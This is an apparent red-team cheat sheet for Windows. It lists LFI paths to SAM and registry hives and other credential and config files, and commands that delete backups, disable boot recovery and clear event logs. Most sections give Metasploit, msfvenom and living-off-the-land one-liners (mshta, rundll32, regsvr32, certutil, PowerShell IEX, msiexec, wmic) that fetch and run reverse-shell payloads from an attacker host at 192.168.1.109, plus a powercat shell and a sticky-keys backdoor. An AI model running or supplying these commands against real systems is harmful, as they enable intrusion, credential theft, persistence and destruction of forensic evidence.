# Important Files

```
LFI Windows Files:
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\repair\SAM
%WINDIR%\win.ini
%SYSTEMDRIVE%\boot.ini
%WINDIR%\Panther\sysprep.inf
%WINDIR%\system32\config\AppEvent.Evt
```

## Collections

- Windows EXE / DLL files: http://www.saule-spb.ru/touch/windows_files.html
- Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ li, https://github.com/LOLBAS-Project/LOLBAS
- [https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/)

## Version information
- `sysinfo`
- Windows 7+: `/windows/system32/license.rtf`
- `/windows/system32/eula.txt`

## Update information
```
WindowsUpdate.log
```

## Update Download locations
```
C:\Windows\SoftwareDistribution\Download  
```

## wbadmin / ntbackup

> https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin

Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface.

Delete any recovery catalogs:
```
cmd.exe /c wbadmin.exe delete catalog -quiet
```

## BCDEdit

> https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options

Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings.

Usable to creating new stores, modifying existing stores, adding boot menu options, and so on.

Windows recovery console does not attempt to repair anything:
```
cmd.exe /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no
```

## wevtutil

> https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil

Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.

Clear System and Security logs:
```
cmd.exe /c wevtutil.exe cl System
cmd.exe /c wevtutil.exe cl Security
```

## DUMPBIN

> https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017

Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs).

## HTA

Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a "fully trusted" application.

## Mshta.exe (HTA)

Running HTA( HTML Application) files

```
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```
```
mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
```

## Rundll32.exe

Invoke a function exported from a DLL
```
use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
msf exploit(windows/smb/smb_delivery) > exploit
```
```
rundll32.exe \\192.168.1.109\vabFG\test.dll,0
```

## Regsvr32.exe

- Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry
- installed in the %systemroot%\System32
- Windows XP and later
- Regsvr32 uses “squiblydoo” technique for bypassing application whitelisting
- Able to request a .sct file and then execute the included PowerShell command inside

```
Syntax: Regsvr32 [/s][/u] [/n] [/i[:cmdline]] <dllname>

/u – Unregister server
/i – Call DllInstall passing it an optional [cmdline]; when it is used with /u, it calls dll to uninstall
/n – do not call DllRegisterServer; this option must be used with /i
/s – Silent; display no message boxes
```

```
use exploit/multi/script/web_delivery
msf exploit (web_delivery)>set target 3
msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)> set lhost 192.168.1.109
msf exploit (web_delivery)>set srvhost 192.168.1.109
msf exploit (web_delivery)>exploit
```

```
regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
```
- https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a
- https://web.archive.org/web/20170419145048/http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html
- https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/

## Certutil.exe

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe

certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```

## Powershell.exe

```
git clone https://github.com/besimorhino/powercat.git
python -m SimpleHTTPServer 80

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
```

## Batch Files

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```

## Cscript

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
script.exe "test.vbs"

powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```

## Msiexec.exe

- Install MSI packages

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi

msiexec /q /i http://192.168.1.109/1.msi
```

## Wmic.exe

- WMI command-line interface that is used for a variety of administrative functions for local and remote machine
- can invoke XSL script (eXtensible Stylesheet Language)

koadic:
```
use stager/js/wmic
set SRVHOST 192.168.1.107
run
```

```
wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"
```

## Prefetch Files Created

- AT.EXE (scheduled jobs/tasks)
- SCHTASKS.EXE (scheduled jobs/tasks)
- CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. )
- NET.EXE (net view, etc.)
- NET1.EXE (net use)
- NETSTAT.EXE (netstat -ano)
- REG.EXE (reg query and reg add)
- SC.EXE (interact with services)
- SYSTEMINFO.EXE (system profiling)
- TASKKILL.EXE (kill running processes)
- TASKLIST.EXE (tasklist /v)
- POWERSHELL.EXE (interact with powershell)
- NBTSTAT.EXE (profile)
- XCOPY.EXE (copy files around)
- NSLOOKUP.EXE (profile)
- QUSER.EXE (profile)
- RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip)
- PING.EXE (check connectivity)
- FTP.EXE (download/upload)
- Various Sysinternal tools (Psexec, sdelete, etc.)
- BITSADMIN.EXE (download/upload)
- ROUTE.EXE (adding persistent routes)
- REGSVR32.EXE (services)
- MAKECAB.EXE (compression before exfil)

> Originally form: http://www.sysforensics.org/2014/01/lateral-movement/. Link is no longer working

## Runonce.exe, msdt.exe, Openwith.exe

> https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636

## sethc.exe (Sticky keys)

By replacing the “Sticky Keys” binary, C:\Windows\System32\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. “Sticky Keys” is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates “Sticky Keys” and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication).

## Discovery

```
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

# Base64 encode / decode
```
certutil -encode inputfile outputfile
certutil -decode inputfile outputfile
```